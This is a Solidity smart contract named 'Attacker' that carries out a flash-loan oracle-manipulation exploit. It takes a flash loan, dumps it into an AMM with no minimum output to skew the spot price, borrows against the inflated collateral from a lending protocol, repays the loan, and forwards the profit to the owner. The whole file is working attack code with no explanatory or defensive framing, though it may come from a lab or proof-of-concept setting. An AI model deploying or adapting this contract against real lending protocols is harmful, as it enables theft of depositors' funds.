// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
interface IPool {
    function flashLoan(uint256 amount, address borrower) external;
}
interface ISwapAMM {
    function swap(address tokenIn, uint256 amountIn, uint256 minAmountOut) external returns (uint256 amountOut);
    function getPrice() external view returns (uint256 priceE18);
}
interface ILender {
    function borrow(uint256 collateralAmount) external returns (uint256 debtAmount);
}
contract Attacker {
    using SafeERC20 for IERC20;
    address public immutable owner;
    address public immutable pool;
    address public immutable amm;
    address public immutable lending;
    address public immutable collateral;
    address public immutable debt;
    uint256 public lastBorrowAmount;
    uint256 public lastProfit;
    uint256 public lastPriceBefore;
    uint256 public lastPriceAfter;
    event AttackStarted(uint256 flashAmount);
    event AttackSnapshot(
        uint256 priceBefore,
        uint256 priceAfter,
        uint256 borrowAmount,
        uint256 profit
    );
    constructor(
        address _pool,
        address _amm,
        address _lending,
        address _collateral,
        address _debt
    ) {
        require(_pool != address(0), "ZERO_POOL");
        require(_amm != address(0), "ZERO_AMM");
        require(_lending != address(0), "ZERO_LENDING");
        require(_collateral != address(0), "ZERO_COLLATERAL");
        require(_debt != address(0), "ZERO_DEBT");
        owner = msg.sender;
        pool = _pool;
        amm = _amm;
        lending = _lending;
        collateral = _collateral;
        debt = _debt;
    }
    modifier onlyOwner() {
        require(msg.sender == owner, "NOT_OWNER");
        _;
    }
    function attack(uint256 flashAmount) external onlyOwner {
        require(flashAmount > 0, "ZERO_FLASH_AMOUNT");
        emit AttackStarted(flashAmount);
        IPool(pool).flashLoan(flashAmount, address(this));
    }
    function executeOperation(uint256 amount) external {
        require(msg.sender == pool, "ONLY_POOL");
        uint256 priceBefore = ISwapAMM(amm).getPrice();
        IERC20(debt).forceApprove(amm, amount);
        ISwapAMM(amm).swap(debt, amount, 0);
        uint256 priceAfter = ISwapAMM(amm).getPrice();
        uint256 collateralAmount = IERC20(collateral).balanceOf(address(this));
        IERC20(collateral).forceApprove(lending, collateralAmount);
        uint256 borrowed = ILender(lending).borrow(collateralAmount);
        IERC20(debt).safeTransfer(pool, amount);
        uint256 profit = IERC20(debt).balanceOf(address(this));
        lastBorrowAmount = borrowed;
        lastProfit = profit;
        lastPriceBefore = priceBefore;
        lastPriceAfter = priceAfter;
        emit AttackSnapshot(priceBefore, priceAfter, borrowed, profit);
    }
    function withdrawProfit() external onlyOwner {
        uint256 debtProfit = IERC20(debt).balanceOf(address(this));
        if (debtProfit > 0) {
            IERC20(debt).safeTransfer(owner, debtProfit);
        }
        uint256 collateralProfit = IERC20(collateral).balanceOf(address(this));
        if (collateralProfit > 0) {
            IERC20(collateral).safeTransfer(owner, collateralProfit);
        }
    }
}
